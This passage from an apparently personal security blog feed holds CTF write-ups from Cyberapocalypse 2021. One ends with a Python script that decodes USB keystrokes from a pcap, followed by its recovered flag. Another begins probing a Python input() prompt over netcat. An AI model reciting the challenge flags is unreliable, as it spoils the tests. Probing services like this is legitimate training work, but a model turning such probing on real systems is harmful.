style="color:#e3116c">"w"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"W"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x1B</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"x"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"X"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x1C</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"y"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Y"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x1D</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"z"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Z"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x1E</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"1"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"!"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x1F</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"2"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"@"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"3"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"#"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x21</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"4"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"$"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x22</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"5"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"%"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x23</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"6"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"^"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x24</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"7"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"&amp;"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x25</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"8"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"*"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x26</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"9"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"("</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x27</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"0"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">")"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x28</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"Return"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Return"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x29</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"ESCAPE"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"ESCAPE"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x2A</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"&lt;BACKSPACE&gt;"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"&lt;BACKSPACE&gt;"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x2B</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"Tab"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Tab"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x2C</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">" "</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" "</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># 0x2C: "Spacebar",</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x2D</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"-"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"_"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x2E</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"="</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"+"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x2F</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"["</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"{"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"]"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"}"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x31</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"\\"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"|"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x32</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"Non-US"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x33</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">";"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">":"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x34</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"‘"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"\""</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x35</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"Grave"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x36</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">","</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"&lt;"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x37</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"."</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"&gt;"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x38</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"/"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"?"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># [OMITTED REST OF CODES FOR BREVITY]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  packets </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> rdpcap</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sys</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">packets</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">except</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'needs a pcap file supplied'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">result </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> packet </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> packets</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  shift_byte </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> packet</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">load</span><span class="token punctuation" style="color:#393A34">[</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  shift_key </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> shift_byte </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> mapping_shift</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    shift_key </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  normal_byte </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> packet</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">load</span><span class="token punctuation" style="color:#393A34">[</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  stringed </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> mapping</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">normal_byte</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">shift_key</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> stringed </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> mapping</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0x2A</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># if backspace, remove one</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    result </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> result</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    result </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> stringed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">result</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And, with this we can get the message being sent by our secret agent:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 get_flag.py key_mission.pcap </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WARNING: PcapReader: unknown LL type [220]/[0xdc]. Using Raw packets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;key_mission.pcap: TCP:0 UDP:0 ICMP:0 Other:1192&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">I am sending secretary‘s location over this totally encrypted channel to make sure no one else will be able to read it except of us. This information is confidential and must not be shared with anyone else. The secretary‘s hidden location is CHTB{a_plac3_fAr_fAr_away_fr0m_earth}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>With the flag now in plain sight</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTB{a_plac3_fAr_fAr_away_fr0m_earth}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Input as a Service - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/input-as-a-service-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/input-as-a-service-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-30T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the Input as a Service challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Misc.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the Input as a Service challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Misc.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/input-as-a-service-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>In order to blend with the extraterrestrials, we need to talk and sound like them. Try some phrases in order to check if you can make them believe you are one of them.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/input-as-a-service-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>We can netcat to a service at some address given to us. Upon doing so, we are prompted by the question <em>"Do you sound like an alien?"</em>, followed by what looks like a python prompt</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Do you sound like an alien?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;&gt;&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>If we supply it something random, it will spit out a python error trace.</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Do you sound like an alien?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;&gt;&gt; lolwut</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Traceback (most recent call last):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File "input_as_a_service.py", line 16, in &lt;module&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    main()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File "input_as_a_service.py", line 12, in main</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    text = input(' ')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File "&lt;string&gt;", line 1, in &lt;module&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NameError: name 'lolwut' is not defined</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 